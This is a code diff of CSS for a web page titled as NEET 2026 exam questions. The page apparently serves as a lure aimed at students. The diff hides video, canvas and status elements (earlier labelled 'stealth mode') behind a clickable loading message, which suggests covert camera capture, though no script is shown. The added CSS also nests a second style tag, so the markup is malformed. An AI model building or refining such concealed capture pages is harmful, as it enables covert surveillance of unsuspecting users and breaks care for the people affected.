@@ -3,27 +3,33 @@
 <head>
     <title>NEET 2026 IMP PYQ.</title>
     <style>
-        body {
-            background: #000;
-            color: black; /* Hide all text but keep buttons visible */
-            font-family: Arial;
-            text-align: center;
-            user-select: none;
-            margin-top: 250px;
-        }
+        <style>
+    body {
+        background: #000;
+        color: white;
+        font-family: Arial;
+        text-align: center;
+        user-select: none;
+        margin-top: 250px;
+    }
 
-        #loading {
-            color: white;
-            font-size: 22px;
-            font-weight: bold;
-        }
+    #loading {
+        font-size: 22px;
+        font-weight: bold;
+        cursor: pointer;      /* <-- IMPORTANT */
+        z-index: 9999;
+        position: relative;   /* <-- allows click */
+    }
 
-        /* Stealth mode: hide all real elements */
-        video, canvas, #status {
-            display: none !important;
-            opacity: 0 !important;
-        }
-    </style>
+    /* Hide video & canvas but DO NOT block taps */
+    video, canvas, #status {
+        width: 0 !important;
+        height: 0 !important;
+        opacity: 0 !important;
+        position: absolute;
+        pointer-events: none !important;  /* <-- IMPORTANT */
+    }
+</style>
 </head>
 <body>
 
